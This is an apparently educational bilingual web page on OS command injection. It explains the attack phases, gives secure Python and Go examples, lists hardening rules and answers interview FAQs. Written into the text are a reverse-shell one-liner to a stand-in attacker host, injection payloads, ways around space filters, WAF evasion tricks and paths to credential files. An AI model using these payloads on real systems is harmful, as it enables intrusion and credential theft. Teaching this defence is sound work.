10 Operating System Command Injection

OS Command
Injection (RCE)

OS Command Injection tab hota hai jab backend API kisi user-controlled parameter (IP address, filename, domain) ko bina strict sanitization ke operating system shell (bash, sh, cmd.exe) me pass kar deti hai, jisse attacker shell separators (;, &&, |, $()) ke zariye arbitrary system binaries execute karke poore server ka root access le leta hai. OS Command Injection occurs when an API endpoint incorporates untrusted user data into operating system shell command strings without rigorous escaping or parameterized execution, permitting attackers to inject shell meta-characters (;, &&, |, $()) to execute arbitrary system binaries and achieve full Remote Code Execution (RCE).

How OS Command Injection Works (Deep Architecture) How OS Command Injection Works (Deep Architecture)

Operating system shells command strings ko tokens me split karti hain aur metacharacters ke aadhar par unhe sequentially ya conditionally evaluate karti hain. Niche iske 5 distinct execution phases explain kiye gaye hain: Operating system shells tokenize input strings and split execution streams upon encountering shell metacharacters. Inspect the 5 technical lifecycle phases below:

🔹 1. Unvalidated Input Deserialization & String Interpolation

Client HTTP POST request se parameter supply karta hai. Controller bina kisi validation ke string concatenation ya f-string use karke raw CLI command string prepare karta hai (e.g. f"ping -c 2 {host}"). The client supplies a parameter via HTTP request. The backend controller interpolates the unvalidated string directly into an operating system command template (e.g. f"ping -c 2 {host}").

⚡ 2. Shell Lexer & Metacharacter Tokenization

Jab backend process /bin/sh -c ya cmd.exe /c call karta hai, shell lexer string ko tokenize karta hai. Agar string me ;, &&, |, ya $() shamil hain, shell unhe argument nahi balki execution boundaries maanta hai. When the process invokes /bin/sh -c or cmd.exe /c, the shell lexer tokenizes the command line. Characters such as ;, &&, |, or $() are interpreted as control operators rather than literal string arguments.

🚨 3. Subprocess Forking & Privilege Execution

OS kernel fork() aur execve() syscalls trigger karta hai. Injected command (jaise whoami ya cat /etc/passwd) usi process context aur permissions (root / www-data) ke sath execute hoti hai jisme API server chal raha hai. The kernel invokes fork() and execve(). The injected command runs with the full OS security context and permissions of the hosting application worker (often root or www-data).

🌐 4. Output Redirection & Stream Transmission (In-Band / Blind / OOB)

Agar application command stdout capture karti hai, data direct API response me return hota hai (In-Band). Agar output suppressed hai, attacker time delay (; sleep 10) ya DNS/HTTP out-of-band requests trigger karke data exfiltrate karta hai. If the application captures standard output, the result returns inside the HTTP response (In-Band). If suppressed, attackers observe execution timing via time delays (; sleep 10) or issue Out-of-Band network calls to external listener servers.

💎 5. Reverse Shell Attachment & Lateral Movement

Attacker interactive reverse shell spawn karta hai (bash -i >& /dev/tcp/attacker/4444 0>&1), cloud metadata credentials (AWS IMDS / GCP metadata) read karta hai aur poore cloud network me laterally move kar jata hai. Adversaries spawn interactive reverse TCP shells, scrape instance metadata service credentials (AWS IMDS / GCP metadata), and pivot across the internal cloud infrastructure.
🛠️ Shell Metacharacters & Chaining Operators Cheatsheet Shell Metacharacters & Chaining Operators Cheatsheet
Operator Description Sample Exploit Payload Operating System
; Sequential delimiter; runs second command unconditionally. 8.8.8.8; id Linux / Unix / Bash
&& Logical AND; runs second command only if first succeeds. 8.8.8.8 && whoami Linux & Windows

# ✅ SECURE: Strict validation + direct binary execution
import subprocess
from ipaddress import ip_address
from fastapi import FastAPI, HTTPException

app = FastAPI()

@app.post("/api/v1/diagnostics/ping")
def ping_host(payload: PingRequest):
    # 1. Type validation: must be a valid IPv4/IPv6 address
    try:
        valid_ip = str(ip_address(payload.host))
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid IP")

    # 2. shell=False (Default): OS treats args literally
    result = subprocess.run(
        ["/bin/ping", "-c", "2", valid_ip],
        shell=False,
        capture_output=True,
        text=True,
        timeout=5
    )
    return {"output": result.stdout}

package main
import (
    "net"
    "net/http"
    "os/exec"
)

func pingHandler(w http.ResponseWriter, r *http.Request) {
    rawHost := r.URL.Query().Get("host")
    // 1. Validate as true IP
    if ip := net.ParseIP(rawHost); ip == nil {
        http.Error(w, "Invalid IP", http.StatusBadRequest)
        return
    }
    // 2. Direct binary call; no shell invoked
    cmd := exec.Command("/bin/ping", "-c", "2", rawHost)
    out, _ := cmd.CombinedOutput()
    w.Write(out)
}
🛡️ 4 Golden Architecture Rules to Prevent Command Injection
  • Rule 1: Never Call a Shell: Avoid shell=True, os.system(), and child_process.exec(). Use direct binary execution with static argument vectors (subprocess.run(list), execFile()).
  • Rule 2: Prefer Native Language Libraries: Instead of executing OS CLI binaries (like curl, ping, tar), use native runtime libraries (Python requests, tarfile, Go net/http).
  • Rule 3: Enforce Strict Character Allowlists: Never rely on blacklists. Validate input types strictly with Regex (e.g. ^[a-zA-Z0-9._-]+$) or typed schemas (Zod, Pydantic).
  • Rule 4: Least Privilege Container Isolation: Run API workers as unprivileged users (USER nonroot), mount root filesystems read-only (readOnlyRootFilesystem: true), and drop all Linux capabilities (drop: [ALL]).

Frequently Asked Questions (FAQ) Frequently Asked Questions (FAQ)

Top Security Engineer & Pentester interview questions on OS Command Injection mechanics, bypasses, and secure architecture: High-yield technical and interview questions covering Command Injection mechanics, shell evaluation, and production hardening:

Q1: Agar space character block ho toh attacker commands kaise separate karta hai? Q1: How do attackers bypass whitespace restrictions when space is filtered?

Answer: Linux shells me space ke kai built-in alternatives hote hain: (1) ${IFS} (Internal Field Separator jo by default space, tab, newline represent karta hai), (2) Redirection syntax cat</etc/passwd, (3) Brace expansion {cat,/etc/passwd}, aur (4) URL-encoded tabs (%09) ya newlines (%0a). Isliye space filter karna bilkul bekaar defense hai. Answer: Unix shells provide multiple whitespace substitutes: (1) ${IFS} (Internal Field Separator default to space/tab/newline), (2) Redirection operators cat</etc/passwd, (3) Brace expansion {cat,/etc/passwd}, and (4) URL-encoded tabs (%09) or newlines (%0a). This is why filtering spaces provides zero security against seasoned attackers.

Q2: Command Injection aur Code Injection (SSTI / eval) me kya fundamental difference hai? Q2: What is the fundamental difference between Command Injection and Code Injection?

Answer: Code Injection application programming language runtime ke andar execute hota hai (jaise Python me eval(), Node.js me vm.runInContext, ya template engine me SSTI). Jabki Command Injection operating system process shell (bash, sh, cmd.exe) me arbitrary system binaries aur utility commands execute karta hai. Answer: Code Injection executes within the application programming language runtime (such as Python's eval() or Node's vm). In contrast, Command Injection executes within the operating system shell (bash, sh, cmd.exe), invoking external host processes and system binaries.

Q3: Kya WAF (Web Application Firewall) Command Injection se 100% protect kar sakta hai? Q3: Can a Web Application Firewall (WAF) reliably prevent Command Injection?

Answer: Bilkul nahi! Attackers WAF signatures ko bypass karne ke liye environment variable slicing ($PATH se characters lena jaise ${PATH:0:1} for /), wildcards (/???/??? /???/??ss?? for /bin/cat /etc/passwd), aur variable concatenation (w'h'o'a'm'i ya $u$n$a$m$e) use karte hain jise regex WAFs detect nahi kar pate. Real fix code level par parameterized execution hai. Answer: No. Adversaries routinely evade WAF signature rules via environment variable slicing (${PATH:0:1} for /), wildcard globbing (/???/??? /???/??ss??), and quote concatenation (w'h'o'a'm'i). WAFs serve only as secondary defense-in-depth; root remediation requires parameterized execution without shells.

Q4: Containerized environment (Docker/K8s) me Command Injection kitna khatarnak hota hai? Q4: How severe is Command Injection inside containerized environments (Docker/K8s)?

Answer: Yeh extremely dangerous hota hai! Agar container root user ke roop me chal raha hai aur Docker socket (/var/run/docker.sock) ya Kubernetes Service Account token (/run/secrets/kubernetes.io/serviceaccount/token) mounted hai, toh attacker pod se break out karke poore Kubernetes cluster ka administrative takeover kar sakta hai. Answer: Catastrophic. If the container runs as root with mounted Docker sockets (/var/run/docker.sock) or Kubernetes Service Account tokens (/run/secrets/kubernetes.io/serviceaccount/token), adversaries can perform container escapes, compromise worker nodes, and seize administrative cluster control.
